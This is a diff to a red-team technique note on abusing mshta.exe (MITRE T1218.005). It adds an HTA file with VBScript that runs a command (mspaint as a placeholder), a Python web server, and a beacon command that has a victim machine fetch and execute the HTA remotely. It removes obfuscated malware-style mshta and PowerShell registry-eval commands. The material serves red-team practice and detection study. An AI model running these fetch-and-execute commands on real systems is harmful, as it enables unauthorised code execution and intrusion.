@@ -1,16 +1,36 @@
 # [MSHTA.exe](https://attack.mitre.org/techniques/T1218/005/)
 
-## Exploit Syntax:[incomplete] 
+## Exploit Syntax:
 
 
-1. Execute the following commands: 
+1. Create an hta file with the following contents and save it in your malware directory: 
 
+```VBScript
+<!DOCTYPE html>
+<html lang-"en">
+<head>
+  <title>This is a bad HTA file</title>
+
+  <HTA:APPLICATION
+    APPLICATIONNAME = "Bad HTA File"
+  />
+
+  <script language = "VBScript">
+    Dim com
+    Set com = CreateObject("WScript.Shell")
+    com.run "cmd.exe /C mspaint.exe"
+    set com = Nothing
+  </script>
+</head>
+```
+
+2. Start a simple http server with Python
+```Bash
+python3 -m http.server 6789
+```
+3. On the victim machine, likely with a beacon run the following:
 ```powershell
-sharpps "c:\windows\system32\mshta.exe" javascript:bz0pbzykh="qoethfr1";jo9=new%20activexobject("wscript.shell"); tkk4qffrj="wrqxzpuvp";zv0v5w=jo9.regread("hklm\\software\\wow6432node\\88b21b0b\\7f490d53");v9tjbmpoy="nwzv9xiv";eval(zv0v5w);wqfccxdq4="u";
-
-
-sharpps "c:\windows\syswow64\windowspowershell\v1.0\powershell.exe" iex $env:veckxeg
-
+sharpps mshta http://<webserverIP>:6789/<nameofHTAfile>
 ```
 
 
